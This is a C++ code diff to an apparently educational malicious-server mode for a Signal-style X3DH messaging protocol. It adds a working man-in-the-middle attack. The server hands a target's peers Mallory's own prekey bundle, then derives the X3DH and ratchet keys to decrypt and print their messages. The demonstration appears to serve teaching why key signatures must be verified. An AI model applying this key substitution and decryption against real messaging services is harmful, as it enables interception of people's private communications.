@@ -256,16 +256,22 @@ void handle_client_connection(int client_socket, int mode) {
             cout<< "[Malicious Server] Fetching prekey bundle for : " << target << endl;
             if(mode == 2){
                 cout<<"MITM Attack: Substituting Mallory's prekey bundle for " << target << endl;
-                string fake_bundle = "{\"type\":\"bundle\",\"bundle\":{"
+                string mallory_ik_pub  = base64_encode(x25519_get_public(MALLORY_IK_PRIV));
+                string mallory_spk_pub = base64_encode(x25519_get_public(MALLORY_SPK_PRIV));
+                string mallory_opk_pub = base64_encode(x25519_get_public(MALLORY_OPK_PRIV));
+
+                string fake_bundle = 
+                    "{\"type\":\"bundle\",\"bundle\":{"
                     "\"user\":\"" + target + "\","
-                    "\"ik_sig\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\","
-                    "\"ik_dh\":\"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\","
-                    "\"spk\":\"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=\","
-                    "\"spk_sig\":\"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD=\","
-                    "\"opk\":\"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE=\","
+                    "\"ik_sig\":\"" + mallory_ik_pub + "\","
+                    "\"ik_dh\":\""  + mallory_ik_pub + "\","
+                    "\"spk\":\""    + mallory_spk_pub + "\","
+                    "\"spk_sig\":\"" + mallory_spk_pub + "\","
+                    "\"opk\":\""    + mallory_opk_pub + "\","
                     "\"opk_id\":1"
                     "},\"count\":5}";
-                send_complete_line(client_socket, fake_bundle);
+
+                    send_complete_line(client_socket, fake_bundle);
             }
             else{
                 string real_bundle;
@@ -305,6 +311,59 @@ void handle_client_connection(int client_socket, int mode) {
             }
             else if(mode == 2){
                 cout<<"[MODE2 - MITM] Decrypting and re-encrypting message, server can read it"<< endl;
+
+                string init_obj   = get_json_object(frame, "init");
+                string alice_ik_b64 = get_json_value(init_obj, "ik_dh");
+                string alice_ek_b64 = get_json_value(init_obj, "ek");
+                string header_dh_b64 = get_json_value(frame, "dh");
+                string ct_b64 = get_json_value(frame, "ct");
+
+                if (!alice_ik_b64.empty() && !alice_ek_b64.empty() && !ct_b64.empty()) {
+                    vector<uint8_t> alice_ik = base64_decode(alice_ik_b64);
+                    vector<uint8_t> alice_ek = base64_decode(alice_ek_b64);
+                    vector<uint8_t> alice_dh = base64_decode(header_dh_b64);
+                    vector<uint8_t> ct       = base64_decode(ct_b64);
+
+                    vector<uint8_t> dh1 = x25519_dh(MALLORY_SPK_PRIV, alice_ik.data()); // DH(SPK_M, IK_A)
+                    vector<uint8_t> dh2 = x25519_dh(MALLORY_IK_PRIV,  alice_ek.data()); // DH(IK_M, EK_A)
+                    vector<uint8_t> dh3 = x25519_dh(MALLORY_SPK_PRIV, alice_ek.data()); // DH(SPK_M, EK_A)
+                    vector<uint8_t> dh4 = x25519_dh(MALLORY_OPK_PRIV, alice_ek.data()); // DH(OPK_M, EK_A)
+
+                    vector<uint8_t> ikm(32, 0xFF);
+                    ikm.insert(ikm.end(), dh1.begin(), dh1.end());
+                    ikm.insert(ikm.end(), dh2.begin(), dh2.end());
+                    ikm.insert(ikm.end(), dh3.begin(), dh3.end());
+                    ikm.insert(ikm.end(), dh4.begin(), dh4.end());
+                    
+                    // Derive initial Root Key (SK) via HKDF-SHA256
+                    vector<uint8_t> salt(32, 0x00);
+                    vector<uint8_t> sk = hkdf_sha256(salt, ikm, "AS3_X3DH", 32);
+
+                    // Initial Ratchet step on receiver (protocol.md Section 4.4)
+                    //DH(SPK_M, Alice_ratchet_pub)
+                    vector<uint8_t> rk_dh = x25519_dh(MALLORY_SPK_PRIV, alice_dh.data());
+                    vector<uint8_t> rk_out = hkdf_sha256(sk, rk_dh, "AS3_ROOT", 64);
+                    vector<uint8_t> ckr(rk_out.begin() + 32, rk_out.end());
+                    
+                    //Derive Message Key (MK) via HMAC-SHA256
+                    vector<uint8_t> mk = hmac_sha256(ckr, {0x01});
+
+                                        // 7. Associated Data: Alice_IK_dh + Mallory_IK_dh_pub (protocol.md Section 3)
+                    vector<uint8_t> mallory_ik_pub = x25519_get_public(MALLORY_IK_PRIV);
+                    vector<uint8_t> ad = alice_ik;
+                    ad.insert(ad.end(), mallory_ik_pub.begin(), mallory_ik_pub.end());
+
+                    // 8. Decrypt payload using ChaCha20-Poly1305
+                    string recovered_plaintext;
+                    if (chacha20poly1305_decrypt(mk, ct, ad, recovered_plaintext)) {
+                        cout << "\n========================================================" << endl;
+                        cout << "[MODE 2 - MITM SUCCESS] RECOVERED PLAINTEXT:" << endl;
+                        cout << ">>> \"" << recovered_plaintext << "\" <<<" << endl;
+                        cout << "========================================================\n" << endl;
+                    } else {
+                        cout << "[MODE 2 - MITM] Decryption failed." << endl;
+                    }
+                }
             }
             {
                 lock_guard<mutex> lock(state_mutex);
